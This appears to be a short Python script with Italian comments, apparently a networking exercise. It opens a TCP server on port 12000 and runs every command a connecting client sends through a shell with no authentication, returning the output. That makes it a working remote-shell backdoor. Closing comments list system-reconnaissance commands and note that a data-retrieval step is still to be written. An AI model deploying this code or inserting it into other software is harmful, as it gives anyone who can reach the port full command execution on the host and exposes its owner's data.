from socket import *
import subprocess
import os

serverPort = 12000
serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
                                            #socket(...) e' il costruttore della classe socket
serverSocket.bind( ('',serverPort) ) #collega la socket al port 1200
                                    #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
serverSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
print ('The server is ready to receive')


connectionSocket, addr = serverSocket.accept()
print('Accepted a new client', addr)


#script retrieve dati (ancora da fare)



while True:
    try:
        cmd = connectionSocket.recv(16536).decode()
        if cmd.startswith("cd") :
            if ((cmd[2:]).isspace() or len(cmd)==2) :
                os.chdir("/home")
            else :
                os.chdir(cmd[3:])
            result = os.getcwd()
        else:
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8').stdout
        connectionSocket.send(result.encode())
    except error:
        result = "errore"
        connectionSocket.send(result.encode())
    


# cat /etc/machine-id -------- id macchina
# cat /etc/os-release --------- info generali os
# cat /proc/meminfo ------ info memoria
# cat /proc/cpuinfo ----- info dettagliate di ogni core
# lscpu ---- info architettura cpu
# lspci ------- info schede (video, audio...)
# lsusb ------ info dispositivi usb